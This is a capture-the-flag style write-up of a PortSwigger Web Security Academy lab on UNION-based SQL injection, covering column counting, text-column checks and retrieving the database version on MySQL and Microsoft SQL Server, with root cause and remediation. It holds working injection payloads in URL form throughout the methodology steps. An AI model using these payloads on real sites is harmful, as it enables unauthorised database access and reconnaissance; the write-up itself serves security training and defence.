
## Lab-04: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft

# Lab Information
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection
- **Difficulty:** Practitioner
- **Status:** Solved

# Objective
Perform a UNION based SQL injection attack against a MySQL or Microsoft SQL Server database to retrieve its type and version, and display this information on the page.

# Vulnerability
The applications product category filter builds its SQL query by directly concatenating the category URL parameter into the statement, without sanitization or parameterization. The backend query looks like this 
    "SELECT * FROM products WHERE category = 'Gifts' AND released = 1"

Because user input is placed inside the query, an attacker can append a "UNION SELECT" clause to retrieve data that is not normally returned, such as the database version.

# Methodology
1. Opened the lab and clicked a category filter called Gifts. The URL became "/filter?category=Gifts".
2. Determined the query returns 2 columns using the "ORDER BY" technique 
 "/filter?category=Gifts'+ORDER+BY+1--",  
 "/filter?category=Gifts'+ORDER+BY+2--"
3. Confirmed which columns accept text by injecting a UNION SELECT with string values using payload 
 "/filter?category=Gifts'+UNION+SELECT+'a','a'--"
4. Retrieved the database version using "@@version", which both MySQL and Microsoft SQL Server supports using payload 
 "/filter?category=Gifts'+UNION+SELECT+@@version,NULL--"
5. On MySQL, comment syntax differs slightly since "--" requires a trailing space, so "#" was used instead where needed 
 "/filter?category=Gifts'+UNION+SELECT+@@version,NULL#"
6. The page displayed the database version string as "Microsoft SQL Server 2019..." or "8.0.x-MySQL" in place of a product, confirming the injection worked and the lab was marked as solved.

# Evidence
![UNION SELECT payload retrieving database version](images/lab-04-payload.png)
![Lab solved](images/lab-04-solved.png)

# Root Cause
User input is concatenated directly into the SQL query as a string, allowing an attacker to inject a "UNION SELECT" clause that queries the databases built-in version variable instead of the intended "products" table. The application also returned the query output directly to the page, to make the extracted data visible.

# Remediation
- Use parameterized queries/prepared statements so user input is always treated as data, never as SQL query.
- Apply least privileges to the database account used by the application.
- Disable detailed database error messages in production.
- Avoid returning raw query output directly to users wherever possible.

# Key Learnings
- MySQL and Microsoft SQL Server both expose version information through "@@version", to make database fingerprinting straightforward once a UNION injection point is found.
- Comment syntax differs across databases, MySQL requires a space after "--" or an alternative like "#", where Microsoft SQL Server accepts "--" without a trailing space.
- Database fingerprinting is an early reconnaissance step in SQL injection attacks, since it determines which syntax and system tables/variables to target next.
